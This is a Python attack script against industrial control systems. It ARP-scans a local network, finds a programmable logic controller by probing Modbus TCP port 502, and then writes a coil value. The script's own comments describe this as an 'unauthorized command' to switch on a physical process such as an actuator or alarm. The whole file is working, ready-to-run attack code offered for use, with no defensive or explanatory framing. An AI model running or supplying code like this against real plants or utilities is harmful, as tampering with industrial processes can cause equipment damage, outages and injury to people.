from scapy.all import ARP, Ether, srp
from pymodbus.client.sync import ModbusTcpClient
import time

def find_plc_ip(target_network="192.168.1.0/24"):
    """
    Scans the network to find the PLC's IP address by looking for Modbus TCP (port 502).
    """
    print("[*] Scanning the network to find PLC...")
    
    # Sending ARP request to find devices in the specified subnet
    arp_request = ARP(pdst=target_network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered_list = srp(broadcast / arp_request, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        ip = received.psrc
        if is_modbus_device(ip):
            print(f"[+] Found PLC at IP: {ip}")
            return ip

    print("[-] No Modbus PLC detected.")
    return None

def is_modbus_device(ip):
    """
    Checks if a device is running Modbus TCP by attempting a connection on port 502.
    """
    try:
        client = ModbusTcpClient(ip, port=502, timeout=2)
        connection = client.connect()
        client.close()
        return connection
    except:
        return False

def send_unauthorized_command(plc_ip):
    """
    Sends an unauthorized command to the PLC to manipulate a process.
    """
    if not plc_ip:
        print("[-] No PLC found. Exiting.")
        return

    print(f"[*] Attempting to send unauthorized command to {plc_ip}...")
    
    # Connect to the PLC
    client = ModbusTcpClient(plc_ip)

    if client.connect():
        print("[+] Successfully connected to PLC!")

        # Example unauthorized command: Modifying a coil/register value
        # Modify as necessary to send the desired unauthorized message
        register_address = 0  # The register you want to modify
        unauthorized_value = 1  # Example: Turn ON a system process (e.g., actuator, alarm)

        response = client.write_coil(register_address, unauthorized_value)
        
        if response.isError():
            print("[-] Failed to send unauthorized command.")
        else:
            print(f"[+] Unauthorized command sent to turn ON a process at register {register_address}!")

        client.close()
    else:
        print("[-] Unable to connect to PLC.")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    send_unauthorized_command(plc_ip)